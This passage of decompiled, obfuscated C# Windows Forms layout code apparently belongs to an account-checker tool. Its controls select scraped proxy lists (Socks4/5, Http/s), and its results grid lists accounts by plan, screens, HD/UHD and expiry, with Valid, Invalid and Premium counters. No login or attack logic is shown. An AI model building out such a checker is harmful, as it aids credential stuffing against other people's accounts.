			this.TypeResolveHandler.UseVisualStyleBackColor = true;
			this.EventItfInfo.BackColor = Color.FromArgb(35, 35, 35);
			this.EventItfInfo.BackgroundImageLayout = ImageLayout.Center;
			this.EventItfInfo.Image = (Image)componentResourceManager.GetObject("PictureBox6.Image");
			this.EventItfInfo.Location = new Point(195, 192);
			this.EventItfInfo.Name = "PictureBox6";
			this.EventItfInfo.Size = new Size(20, 20);
			this.EventItfInfo.SizeMode = PictureBoxSizeMode.StretchImage;
			this.EventItfInfo.TabIndex = 70;
			this.EventItfInfo.TabStop = false;
			this.SafeTokenHandle.BackColor = Color.FromArgb(35, 35, 35);
			this.SafeTokenHandle.BackgroundImageLayout = ImageLayout.Center;
			this.SafeTokenHandle.Location = new Point(191, 189);
			this.SafeTokenHandle.Name = "PictureBox7";
			this.SafeTokenHandle.Size = new Size(27, 27);
			this.SafeTokenHandle.SizeMode = PictureBoxSizeMode.StretchImage;
			this.SafeTokenHandle.TabIndex = 69;
			this.SafeTokenHandle.TabStop = false;
			this.RawAclWellKnownSidType.BackColor = Color.FromArgb(40, 40, 40);
			this.RawAclWellKnownSidType.Location = new Point(0, 177);
			this.RawAclWellKnownSidType.Name = "Panel18";
			this.RawAclWellKnownSidType.Size = new Size(227, 5);
			this.RawAclWellKnownSidType.TabIndex = 67;
			this.SharedStatics.AutoStyle = false;
			this.SharedStatics.BackColor = Color.Transparent;
			this.SharedStatics.BackgroundImageLayout = ImageLayout.None;
			this.SharedStatics.BorderColor = Color.FromArgb(98, 98, 98);
			this.SharedStatics.GradientColor = Color.FromArgb(40, 40, 40);
			this.SharedStatics.HoverColor = Color.FromArgb(40, 40, 40);
			this.SharedStatics.LeftColor = Color.FromArgb(0, 122, 204);
			this.SharedStatics.Location = new Point(14, 219);
			this.SharedStatics.Maximum = 120;
			this.SharedStatics.Minimum = 1;
			this.SharedStatics.Name = "MetroTrackbar4";
			this.SharedStatics.RegionColor = Color.FromArgb(0, 153, 255);
			this.SharedStatics.RightColor = Color.FromArgb(63, 63, 63);
			this.SharedStatics.Size = new Size(197, 15);
			this.SharedStatics.SliderColor = Color.FromArgb(40, 40, 40);
			this.SharedStatics.SliderWidth = 6;
			this.SharedStatics.Style = Design.Style.Custom;
			this.SharedStatics.TabIndex = 11;
			this.SharedStatics.Value = 15;
			this.ISCIIDecoder.AutoSize = true;
			this.ISCIIDecoder.BackColor = Color.Transparent;
			this.ISCIIDecoder.Font = new Font("Segoe UI", 10f);
			this.ISCIIDecoder.ForeColor = Color.White;
			this.ISCIIDecoder.Location = new Point(132, 193);
			this.ISCIIDecoder.Name = "MetroLabel7";
			this.ISCIIDecoder.RightToLeft = RightToLeft.No;
			this.ISCIIDecoder.Size = new Size(53, 19);
			this.ISCIIDecoder.TabIndex = 11;
			this.ISCIIDecoder.Text = "15 Min";
			this.RawSecurityDescriptor.BackColor = Color.FromArgb(35, 35, 35);
			this.RawSecurityDescriptor.BackgroundImageLayout = ImageLayout.None;
			this.RawSecurityDescriptor.CheckColor = Color.FromArgb(0, 122, 204);
			this.RawSecurityDescriptor.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.RawSecurityDescriptor.DefaultColor = Color.FromArgb(63, 63, 63);
			this.RawSecurityDescriptor.Font = new Font("Segoe UI", 10f);
			this.RawSecurityDescriptor.ForeColor = Color.White;
			this.RawSecurityDescriptor.HoverColor = Color.FromArgb(98, 98, 98);
			this.RawSecurityDescriptor.Location = new Point(24, 144);
			this.RawSecurityDescriptor.Name = "MetroChecker9";
			this.RawSecurityDescriptor.PressedColor = Color.FromArgb(0, 99, 165);
			this.RawSecurityDescriptor.Size = new Size(154, 14);
			this.RawSecurityDescriptor.Style = Design.Style.Custom;
			this.RawSecurityDescriptor.TabIndex = 14;
			this.RawSecurityDescriptor.Text = "Fineproxy.org - Http/s";
			this.JitHelpers.BackColor = Color.FromArgb(35, 35, 35);
			this.JitHelpers.BackgroundImageLayout = ImageLayout.None;
			this.JitHelpers.CheckColor = Color.FromArgb(0, 122, 204);
			this.JitHelpers.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.JitHelpers.DefaultColor = Color.FromArgb(63, 63, 63);
			this.JitHelpers.Font = new Font("Segoe UI", 10f);
			this.JitHelpers.ForeColor = Color.White;
			this.JitHelpers.HoverColor = Color.FromArgb(98, 98, 98);
			this.JitHelpers.Location = new Point(34, 194);
			this.JitHelpers.Name = "MetroChecker10";
			this.JitHelpers.PressedColor = Color.FromArgb(0, 99, 165);
			this.JitHelpers.Size = new Size(105, 14);
			this.JitHelpers.Style = Design.Style.Custom;
			this.JitHelpers.TabIndex = 12;
			this.JitHelpers.Text = "Auto Update :";
			this.ThreadPoolGlobals.BackColor = Color.FromArgb(35, 35, 35);
			this.ThreadPoolGlobals.BackgroundImageLayout = ImageLayout.None;
			this.ThreadPoolGlobals.CheckColor = Color.FromArgb(0, 122, 204);
			this.ThreadPoolGlobals.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.ThreadPoolGlobals.DefaultColor = Color.FromArgb(63, 63, 63);
			this.ThreadPoolGlobals.Font = new Font("Segoe UI", 10f);
			this.ThreadPoolGlobals.ForeColor = Color.White;
			this.ThreadPoolGlobals.HoverColor = Color.FromArgb(98, 98, 98);
			this.ThreadPoolGlobals.Location = new Point(24, 114);
			this.ThreadPoolGlobals.Name = "MetroChecker8";
			this.ThreadPoolGlobals.PressedColor = Color.FromArgb(0, 99, 165);
			this.ThreadPoolGlobals.Size = new Size(182, 14);
			this.ThreadPoolGlobals.Style = Design.Style.Custom;
			this.ThreadPoolGlobals.TabIndex = 13;
			this.ThreadPoolGlobals.Text = "Free-Proxy-list.net - Http/s";
			this.FileAttributes.BackColor = Color.FromArgb(35, 35, 35);
			this.FileAttributes.BackgroundImageLayout = ImageLayout.None;
			this.FileAttributes.CheckColor = Color.FromArgb(0, 122, 204);
			this.FileAttributes.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.FileAttributes.DefaultColor = Color.FromArgb(63, 63, 63);
			this.FileAttributes.Font = new Font("Segoe UI", 10f);
			this.FileAttributes.ForeColor = Color.White;
			this.FileAttributes.HoverColor = Color.FromArgb(98, 98, 98);
			this.FileAttributes.Location = new Point(24, 81);
			this.FileAttributes.Name = "MetroChecker7";
			this.FileAttributes.PressedColor = Color.FromArgb(0, 99, 165);
			this.FileAttributes.Size = new Size(177, 14);
			this.FileAttributes.Style = Design.Style.Custom;
			this.FileAttributes.TabIndex = 12;
			this.FileAttributes.Text = "Proxyscrape.com - Socks5";
			this.InvalidFilterCriteriaExceptionMdaHelper.BackColor = Color.FromArgb(35, 35, 35);
			this.InvalidFilterCriteriaExceptionMdaHelper.BackgroundImageLayout = ImageLayout.None;
			this.InvalidFilterCriteriaExceptionMdaHelper.CheckColor = Color.FromArgb(0, 122, 204);
			this.InvalidFilterCriteriaExceptionMdaHelper.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.InvalidFilterCriteriaExceptionMdaHelper.DefaultColor = Color.FromArgb(63, 63, 63);
			this.InvalidFilterCriteriaExceptionMdaHelper.Font = new Font("Segoe UI", 10f);
			this.InvalidFilterCriteriaExceptionMdaHelper.ForeColor = Color.White;
			this.InvalidFilterCriteriaExceptionMdaHelper.HoverColor = Color.FromArgb(98, 98, 98);
			this.InvalidFilterCriteriaExceptionMdaHelper.Location = new Point(24, 50);
			this.InvalidFilterCriteriaExceptionMdaHelper.Name = "MetroChecker6";
			this.InvalidFilterCriteriaExceptionMdaHelper.PressedColor = Color.FromArgb(0, 99, 165);
			this.InvalidFilterCriteriaExceptionMdaHelper.Size = new Size(177, 14);
			this.InvalidFilterCriteriaExceptionMdaHelper.Style = Design.Style.Custom;
			this.InvalidFilterCriteriaExceptionMdaHelper.TabIndex = 11;
			this.InvalidFilterCriteriaExceptionMdaHelper.Text = "Proxyscrape.com - Socks4";
			this.BinaryTypeEnum.BackColor = Color.FromArgb(35, 35, 35);
			this.BinaryTypeEnum.BackgroundImageLayout = ImageLayout.None;
			this.BinaryTypeEnum.CheckColor = Color.FromArgb(0, 122, 204);
			this.BinaryTypeEnum.Checked = true;
			this.BinaryTypeEnum.CheckedBorderColor = Color.FromArgb(98, 98, 98);
			this.BinaryTypeEnum.DefaultColor = Color.FromArgb(63, 63, 63);
			this.BinaryTypeEnum.Font = new Font("Segoe UI", 10f);
			this.BinaryTypeEnum.ForeColor = Color.White;
			this.BinaryTypeEnum.HoverColor = Color.FromArgb(98, 98, 98);
			this.BinaryTypeEnum.Location = new Point(24, 16);
			this.BinaryTypeEnum.Name = "MetroChecker5";
			this.BinaryTypeEnum.PressedColor = Color.FromArgb(0, 99, 165);
			this.BinaryTypeEnum.Size = new Size(174, 14);
			this.BinaryTypeEnum.Style = Design.Style.Custom;
			this.BinaryTypeEnum.TabIndex = 10;
			this.BinaryTypeEnum.Text = "Proxyscrape.com - Http/s";
			this.ComMemberType.BackColor = Color.FromArgb(45, 45, 48);
			this.ComMemberType.Location = new Point(3, 267);
			this.ComMemberType.Name = "Panel5";
			this.ComMemberType.Size = new Size(230, 3);
			this.ComMemberType.TabIndex = 15;
			this.X509CertificateCMSHASHDIGESTMETHOD.BackColor = Color.FromArgb(45, 45, 48);
			this.X509CertificateCMSHASHDIGESTMETHOD.Location = new Point(241, 202);
			this.X509CertificateCMSHASHDIGESTMETHOD.Name = "Panel8";
			this.X509CertificateCMSHASHDIGESTMETHOD.Size = new Size(230, 3);
			this.X509CertificateCMSHASHDIGESTMETHOD.TabIndex = 15;
			this.CompressedStackRunData.BackColor = Color.FromArgb(45, 45, 48);
			this.CompressedStackRunData.Location = new Point(6, 117);
			this.CompressedStackRunData.Name = "Panel13";
			this.CompressedStackRunData.Size = new Size(230, 3);
			this.CompressedStackRunData.TabIndex = 16;
			this.RuntimeEventInfo.AllowUserToAddRows = false;
			this.RuntimeEventInfo.AllowUserToDeleteRows = false;
			this.RuntimeEventInfo.AllowUserToResizeRows = false;
			this.RuntimeEventInfo.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
			this.RuntimeEventInfo.BackgroundColor = Color.FromArgb(35, 35, 35);
			this.RuntimeEventInfo.BorderStyle = BorderStyle.None;
			this.RuntimeEventInfo.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle.BackColor = Color.FromArgb(45, 45, 48);
			dataGridViewCellStyle.Font = new Font("Segoe UI", 9f);
			dataGridViewCellStyle.ForeColor = Color.White;
			dataGridViewCellStyle.SelectionBackColor = Color.FromArgb(45, 45, 48);
			dataGridViewCellStyle.SelectionForeColor = Color.White;
			dataGridViewCellStyle.WrapMode = DataGridViewTriState.True;
			this.RuntimeEventInfo.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.RuntimeEventInfo.ColumnHeadersHeight = 30;
			this.RuntimeEventInfo.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
			this.RuntimeEventInfo.Columns.AddRange(new DataGridViewColumn[]
			{
				this.ObjectCloneHelper,
				this.LogSwitch,
				this.AllMembershipConditionEncoderExceptionFallback,
				this.WindowsPrincipal,
				this.InputRecord,
				this.GCSettings,
				this.RemotingException
			});
			dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = Color.FromArgb(40, 40, 40);
			dataGridViewCellStyle2.Font = new Font("Segoe UI", 9f);
			dataGridViewCellStyle2.ForeColor = Color.FromArgb(200, 200, 200);
			dataGridViewCellStyle2.SelectionBackColor = Color.FromArgb(45, 45, 48);
			dataGridViewCellStyle2.SelectionForeColor = Color.White;
			dataGridViewCellStyle2.WrapMode = DataGridViewTriState.False;
			this.RuntimeEventInfo.DefaultCellStyle = dataGridViewCellStyle2;
			this.RuntimeEventInfo.EnableHeadersVisualStyles = false;
			this.RuntimeEventInfo.GridColor = Color.FromArgb(35, 35, 35);
			this.RuntimeEventInfo.Location = new Point(483, 6);
			this.RuntimeEventInfo.Name = "DataGridView1";
			this.RuntimeEventInfo.RightToLeft = RightToLeft.No;
			this.RuntimeEventInfo.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
			dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = Color.FromArgb(40, 40, 40);
			dataGridViewCellStyle3.Font = new Font("Segoe UI", 9f);
			dataGridViewCellStyle3.ForeColor = Color.White;
			dataGridViewCellStyle3.SelectionBackColor = Color.FromArgb(45, 45, 48);
			dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle3.WrapMode = DataGridViewTriState.True;
			this.RuntimeEventInfo.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.RuntimeEventInfo.RowHeadersVisible = false;
			this.RuntimeEventInfo.Size = new Size(803, 338);
			this.RuntimeEventInfo.TabIndex = 29;
			this.ObjectCloneHelper.FillWeight = 300f;
			this.ObjectCloneHelper.HeaderText = "Accounts";
			this.ObjectCloneHelper.Name = "Login";
			this.LogSwitch.HeaderText = "Plan";
			this.LogSwitch.Name = "Column1";
			this.AllMembershipConditionEncoderExceptionFallback.HeaderText = "Screens";
			this.AllMembershipConditionEncoderExceptionFallback.Name = "Column2";
			this.WindowsPrincipal.HeaderText = "HD";
			this.WindowsPrincipal.Name = "Column4";
			this.InputRecord.HeaderText = "UHD";
			this.InputRecord.Name = "Column5";
			this.GCSettings.HeaderText = "Expires in";
			this.GCSettings.Name = "Expires";
			this.RemotingException.FillWeight = 140f;
			this.RemotingException.HeaderText = "Language - Country";
			this.RemotingException.Name = "Column3";
			this.IMembershipConditionDelegateBindingFlags.BackColor = Color.FromArgb(35, 35, 35);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.SynchronizationContextPropertiesPredicate1);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.ParseFlags);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.NamedPermissionSet);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.BinaryMethodCallSearchOption);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.TypeBuilderInstantiation);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.InvalidFilterCriteriaException);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.UnmanagedFunctionPointerAttribute);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.DictionaryBase);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.Stream);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.LocalBuilderContextAttributeEntry);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.StoreCategoryEnumeration);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.NullStream);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.StateManagerRunningState);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.MdaState);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.FileStreamAsyncResult);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.ApplicationTrustEnumerator);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.Currency);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.MarshalAsAttributeCodeGroupStack);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.CompositeCultureData);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.BadImageFormatException);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.XmlNamespaceEncoderDecoderFallbackBuffer);
			this.IMembershipConditionDelegateBindingFlags.Controls.Add(this.IMuiResourceIdLookupMapEntry);
			this.IMembershipConditionDelegateBindingFlags.Cursor = Cursors.Default;
			this.IMembershipConditionDelegateBindingFlags.Location = new Point(483, 351);
			this.IMembershipConditionDelegateBindingFlags.Name = "Panel3";
			this.IMembershipConditionDelegateBindingFlags.Size = new Size(803, 142);
			this.IMembershipConditionDelegateBindingFlags.TabIndex = 12;
			this.SynchronizationContextPropertiesPredicate1.BackColor = Color.FromArgb(35, 35, 35);
			this.SynchronizationContextPropertiesPredicate1.BackgroundImageLayout = ImageLayout.Center;
			this.SynchronizationContextPropertiesPredicate1.Image = (Image)componentResourceManager.GetObject("PictureBox12.Image");
			this.SynchronizationContextPropertiesPredicate1.Location = new Point(752, 100);
			this.SynchronizationContextPropertiesPredicate1.Name = "PictureBox12";
			this.SynchronizationContextPropertiesPredicate1.Size = new Size(28, 28);
			this.SynchronizationContextPropertiesPredicate1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.SynchronizationContextPropertiesPredicate1.TabIndex = 89;
			this.SynchronizationContextPropertiesPredicate1.TabStop = false;
			this.ParseFlags.BackColor = Color.FromArgb(35, 35, 35);
			this.ParseFlags.BackgroundImageLayout = ImageLayout.Center;
			this.ParseFlags.Location = new Point(749, 97);
			this.ParseFlags.Name = "PictureBox13";
			this.ParseFlags.Size = new Size(35, 35);
			this.ParseFlags.SizeMode = PictureBoxSizeMode.StretchImage;
			this.ParseFlags.TabIndex = 88;
			this.ParseFlags.TabStop = false;
			this.NamedPermissionSet.AutoSize = true;
			this.NamedPermissionSet.Font = new Font("Segoe UI", 11.25f);
			this.NamedPermissionSet.Location = new Point(131, 83);
			this.NamedPermissionSet.Name = "Label33";
			this.NamedPermissionSet.RightToLeft = RightToLeft.No;
			this.NamedPermissionSet.Size = new Size(17, 20);
			this.NamedPermissionSet.TabIndex = 87;
			this.NamedPermissionSet.Text = "0";
			this.NamedPermissionSet.TextAlign = ContentAlignment.MiddleRight;
			this.BinaryMethodCallSearchOption.AutoSize = true;
			this.BinaryMethodCallSearchOption.Font = new Font("Segoe UI", 11.25f);
			this.BinaryMethodCallSearchOption.Location = new Point(26, 83);
			this.BinaryMethodCallSearchOption.Name = "Label34";
			this.BinaryMethodCallSearchOption.RightToLeft = RightToLeft.No;
			this.BinaryMethodCallSearchOption.Size = new Size(72, 20);
			this.BinaryMethodCallSearchOption.TabIndex = 86;
			this.BinaryMethodCallSearchOption.Text = "Checked :";
			this.BinaryMethodCallSearchOption.TextAlign = ContentAlignment.MiddleRight;
			this.TypeBuilderInstantiation.BackColor = Color.FromArgb(40, 40, 40);
			this.TypeBuilderInstantiation.Location = new Point(243, 0);
			this.TypeBuilderInstantiation.Name = "Panel6";
			this.TypeBuilderInstantiation.Size = new Size(5, 142);
			this.TypeBuilderInstantiation.TabIndex = 80;
			this.InvalidFilterCriteriaException.BackColor = Color.FromArgb(40, 40, 40);
			this.InvalidFilterCriteriaException.Location = new Point(243, 41);
			this.InvalidFilterCriteriaException.Name = "Panel14";
			this.InvalidFilterCriteriaException.Size = new Size(560, 5);
			this.InvalidFilterCriteriaException.TabIndex = 79;
			this.UnmanagedFunctionPointerAttribute.AutoSize = true;
			this.UnmanagedFunctionPointerAttribute.Font = new Font("Segoe UI", 11.25f);
			this.UnmanagedFunctionPointerAttribute.ForeColor = Color.DeepSkyBlue;
			this.UnmanagedFunctionPointerAttribute.Location = new Point(362, 83);
			this.UnmanagedFunctionPointerAttribute.Name = "Label17";
			this.UnmanagedFunctionPointerAttribute.RightToLeft = RightToLeft.No;
			this.UnmanagedFunctionPointerAttribute.Size = new Size(17, 20);
			this.UnmanagedFunctionPointerAttribute.TabIndex = 85;
			this.UnmanagedFunctionPointerAttribute.Text = "0";
			this.UnmanagedFunctionPointerAttribute.TextAlign = ContentAlignment.MiddleRight;
			this.DictionaryBase.AutoSize = true;
			this.DictionaryBase.Font = new Font("Segoe UI", 11.25f);
			this.DictionaryBase.ForeColor = Color.White;
			this.DictionaryBase.Location = new Point(265, 83);
			this.DictionaryBase.Name = "Label18";
			this.DictionaryBase.RightToLeft = RightToLeft.No;
			this.DictionaryBase.Size = new Size(76, 20);
			this.DictionaryBase.TabIndex = 84;
			this.DictionaryBase.Text = "Standard :";
			this.DictionaryBase.TextAlign = ContentAlignment.MiddleRight;
			this.Stream.AutoSize = true;
			this.Stream.Font = new Font("Segoe UI", 11.25f);
			this.Stream.ForeColor = Color.FromArgb(255, 192, 128);
			this.Stream.Location = new Point(362, 9);
			this.Stream.Name = "Label20";
			this.Stream.RightToLeft = RightToLeft.No;
			this.Stream.Size = new Size(17, 20);
			this.Stream.TabIndex = 83;
			this.Stream.Text = "0";
			this.Stream.TextAlign = ContentAlignment.MiddleRight;
			this.LocalBuilderContextAttributeEntry.AutoSize = true;
			this.LocalBuilderContextAttributeEntry.Font = new Font("Segoe UI", 11.25f);
			this.LocalBuilderContextAttributeEntry.ForeColor = Color.Violet;
			this.LocalBuilderContextAttributeEntry.Location = new Point(362, 61);
			this.LocalBuilderContextAttributeEntry.Name = "Label22";
			this.LocalBuilderContextAttributeEntry.RightToLeft = RightToLeft.No;
			this.LocalBuilderContextAttributeEntry.Size = new Size(17, 20);
			this.LocalBuilderContextAttributeEntry.TabIndex = 82;
			this.LocalBuilderContextAttributeEntry.Text = "0";
			this.LocalBuilderContextAttributeEntry.TextAlign = ContentAlignment.MiddleRight;
			this.StoreCategoryEnumeration.AutoSize = true;
			this.StoreCategoryEnumeration.Font = new Font("Segoe UI", 11.25f);
			this.StoreCategoryEnumeration.ForeColor = Color.White;
			this.StoreCategoryEnumeration.Location = new Point(265, 9);
			this.StoreCategoryEnumeration.Name = "Label23";
			this.StoreCategoryEnumeration.RightToLeft = RightToLeft.No;
			this.StoreCategoryEnumeration.Size = new Size(44, 20);
			this.StoreCategoryEnumeration.TabIndex = 81;
			this.StoreCategoryEnumeration.Text = "Free :";
			this.StoreCategoryEnumeration.TextAlign = ContentAlignment.MiddleRight;
			this.NullStream.AutoSize = true;
			this.NullStream.Font = new Font("Segoe UI", 11.25f);
			this.NullStream.ForeColor = Color.White;
			this.NullStream.Location = new Point(265, 61);
			this.NullStream.Name = "Label24";
			this.NullStream.RightToLeft = RightToLeft.No;
			this.NullStream.Size = new Size(81, 20);
			this.NullStream.TabIndex = 80;
			this.NullStream.Text = "Premiums :";
			this.NullStream.TextAlign = ContentAlignment.MiddleRight;
			this.StateManagerRunningState.AutoSize = true;
			this.StateManagerRunningState.Font = new Font("Segoe UI", 11.25f);
			this.StateManagerRunningState.ForeColor = Color.DeepPink;
			this.StateManagerRunningState.Location = new Point(362, 108);
			this.StateManagerRunningState.Name = "Label37";
			this.StateManagerRunningState.RightToLeft = RightToLeft.No;
			this.StateManagerRunningState.Size = new Size(17, 20);
			this.StateManagerRunningState.TabIndex = 78;
			this.StateManagerRunningState.Text = "0";
			this.StateManagerRunningState.TextAlign = ContentAlignment.MiddleRight;
			this.MdaState.AutoSize = true;
			this.MdaState.Font = new Font("Segoe UI", 11.25f);
			this.MdaState.ForeColor = Color.White;
			this.MdaState.Location = new Point(265, 108);
			this.MdaState.Name = "Label38";
			this.MdaState.RightToLeft = RightToLeft.No;
			this.MdaState.Size = new Size(50, 20);
			this.MdaState.TabIndex = 77;
			this.MdaState.Text = "Basic :";
			this.MdaState.TextAlign = ContentAlignment.MiddleRight;
			this.FileStreamAsyncResult.AutoSize = true;
			this.FileStreamAsyncResult.Font = new Font("Segoe UI", 11.25f);
			this.FileStreamAsyncResult.ForeColor = Color.FromArgb(255, 168, 0);
			this.FileStreamAsyncResult.Location = new Point(131, 64);
			this.FileStreamAsyncResult.Name = "Label16";
			this.FileStreamAsyncResult.RightToLeft = RightToLeft.No;
			this.FileStreamAsyncResult.Size = new Size(17, 20);
			this.FileStreamAsyncResult.TabIndex = 21;
			this.FileStreamAsyncResult.Text = "0";
			this.FileStreamAsyncResult.TextAlign = ContentAlignment.MiddleRight;
			this.ApplicationTrustEnumerator.AutoSize = true;
			this.ApplicationTrustEnumerator.Font = new Font("Segoe UI", 11.25f);
			this.ApplicationTrustEnumerator.ForeColor = Color.FromArgb(192, 0, 0);
			this.ApplicationTrustEnumerator.Location = new Point(131, 45);
			this.ApplicationTrustEnumerator.Name = "Label15";
			this.ApplicationTrustEnumerator.RightToLeft = RightToLeft.No;
			this.ApplicationTrustEnumerator.Size = new Size(17, 20);
			this.ApplicationTrustEnumerator.TabIndex = 20;
			this.ApplicationTrustEnumerator.Text = "0";
			this.ApplicationTrustEnumerator.TextAlign = ContentAlignment.MiddleRight;
			this.Currency.AutoSize = true;
			this.Currency.Font = new Font("Segoe UI", 11.25f);
			this.Currency.Location = new Point(131, 103);
			this.Currency.Name = "Label14";
			this.Currency.RightToLeft = RightToLeft.No;
			this.Currency.Size = new Size(17, 20);
			this.Currency.TabIndex = 19;
			this.Currency.Text = "0";
			this.Currency.TextAlign = ContentAlignment.MiddleRight;
			this.MarshalAsAttributeCodeGroupStack.AutoSize = true;
			this.MarshalAsAttributeCodeGroupStack.Font = new Font("Segoe UI", 11.25f);
			this.MarshalAsAttributeCodeGroupStack.ForeColor = Color.FromArgb(0, 192, 0);
			this.MarshalAsAttributeCodeGroupStack.Location = new Point(131, 26);
			this.MarshalAsAttributeCodeGroupStack.Name = "Label13";
			this.MarshalAsAttributeCodeGroupStack.RightToLeft = RightToLeft.No;
			this.MarshalAsAttributeCodeGroupStack.Size = new Size(17, 20);
			this.MarshalAsAttributeCodeGroupStack.TabIndex = 18;
			this.MarshalAsAttributeCodeGroupStack.Text = "0";
			this.MarshalAsAttributeCodeGroupStack.TextAlign = ContentAlignment.MiddleRight;
			this.CompositeCultureData.AutoSize = true;
			this.CompositeCultureData.Font = new Font("Segoe UI", 11.25f);
			this.CompositeCultureData.Location = new Point(26, 103);
			this.CompositeCultureData.Name = "Label12";
			this.CompositeCultureData.RightToLeft = RightToLeft.No;
			this.CompositeCultureData.Size = new Size(87, 20);
			this.CompositeCultureData.TabIndex = 17;
			this.CompositeCultureData.Text = "Remaining :";
			this.CompositeCultureData.TextAlign = ContentAlignment.MiddleRight;
			this.BadImageFormatException.AutoSize = true;
			this.BadImageFormatException.Font = new Font("Segoe UI", 11.25f);
			this.BadImageFormatException.Location = new Point(26, 64);
			this.BadImageFormatException.Name = "Label11";
			this.BadImageFormatException.RightToLeft = RightToLeft.No;
			this.BadImageFormatException.Size = new Size(54, 20);
			this.BadImageFormatException.TabIndex = 16;
			this.BadImageFormatException.Text = "Errors :";
			this.BadImageFormatException.TextAlign = ContentAlignment.MiddleRight;
			this.XmlNamespaceEncoderDecoderFallbackBuffer.AutoSize = true;
			this.XmlNamespaceEncoderDecoderFallbackBuffer.Font = new Font("Segoe UI", 11.25f);
			this.XmlNamespaceEncoderDecoderFallbackBuffer.Location = new Point(26, 45);
			this.XmlNamespaceEncoderDecoderFallbackBuffer.Name = "Label10";
			this.XmlNamespaceEncoderDecoderFallbackBuffer.RightToLeft = RightToLeft.No;
			this.XmlNamespaceEncoderDecoderFallbackBuffer.Size = new Size(60, 20);
			this.XmlNamespaceEncoderDecoderFallbackBuffer.TabIndex = 15;
			this.XmlNamespaceEncoderDecoderFallbackBuffer.Text = "Invalid :";
			this.XmlNamespaceEncoderDecoderFallbackBuffer.TextAlign = ContentAlignment.MiddleRight;
			this.IMuiResourceIdLookupMapEntry.AutoSize = true;
			this.IMuiResourceIdLookupMapEntry.Font = new Font("Segoe UI", 11.25f);
			this.IMuiResourceIdLookupMapEntry.Location = new Point(26, 26);
			this.IMuiResourceIdLookupMapEntry.Name = "Label9";
			this.IMuiResourceIdLookupMapEntry.RightToLeft = RightToLeft.No;
			this.IMuiResourceIdLookupMapEntry.Size = new Size(49, 20);
			this.IMuiResourceIdLookupMapEntry.TabIndex = 14;
			this.IMuiResourceIdLookupMapEntry.Text = "Valid :";
			this.IMuiResourceIdLookupMapEntry.TextAlign = ContentAlignment.MiddleRight;
			this.SZArrayEnumerator.BackColor = Color.FromArgb(35, 35, 35);
			this.SZArrayEnumerator.Controls.Add(this.SoapIntegerInt32);
			this.SZArrayEnumerator.Controls.Add(this.TOKENGROUPSOverlappedDataCacheLine);
			this.SZArrayEnumerator.Controls.Add(this.ThreadPool);
			this.SZArrayEnumerator.Controls.Add(this.DateBuffer);
			this.SZArrayEnumerator.Controls.Add(this.ResolveEventArgsSHA384);
			this.SZArrayEnumerator.Controls.Add(this.ScopeTree);
			this.SZArrayEnumerator.Controls.Add(this.TypeLibConverter);
			this.SZArrayEnumerator.Controls.Add(this.CompatibilityFlag);
			this.SZArrayEnumerator.Cursor = Cursors.Default;
			this.SZArrayEnumerator.Location = new Point(245, 6);
			this.SZArrayEnumerator.Name = "Panel1";
			this.SZArrayEnumerator.Size = new Size(226, 302);
			this.SZArrayEnumerator.TabIndex = 11;
			this.SoapIntegerInt32.IReportMatchMembershipCondition = false;
			this.SoapIntegerInt32.FlatStyle = FlatStyle.Flat;
			this.SoapIntegerInt32.Font = new Font("Segoe UI", 9f);
			this.SoapIntegerInt32.ForeColor = Color.FromArgb(200, 200, 200);
			this.SoapIntegerInt32.Location = new Point(32, 269);
			this.SoapIntegerInt32.Name = "MetroChecker4";
			this.SoapIntegerInt32.IServerChannelSinkIServiceProvider = false;
			this.SoapIntegerInt32.Size = new Size(180, 22);
			this.SoapIntegerInt32.TabIndex = 75;
			this.SoapIntegerInt32.Text = "Load Proxies by Scraper";
			this.SoapIntegerInt32.TextAlign = ContentAlignment.MiddleRight;
			this.SoapIntegerInt32.TextImageRelation = TextImageRelation.TextAboveImage;
			this.SoapIntegerInt32.UseVisualStyleBackColor = true;
			this.TOKENGROUPSOverlappedDataCacheLine.AccentColor = Color.FromArgb(0, 122, 204);
			this.TOKENGROUPSOverlappedDataCacheLine.ArrowColor = Color.FromArgb(98, 98, 98);
			this.TOKENGROUPSOverlappedDataCacheLine.AutoStyle = false;
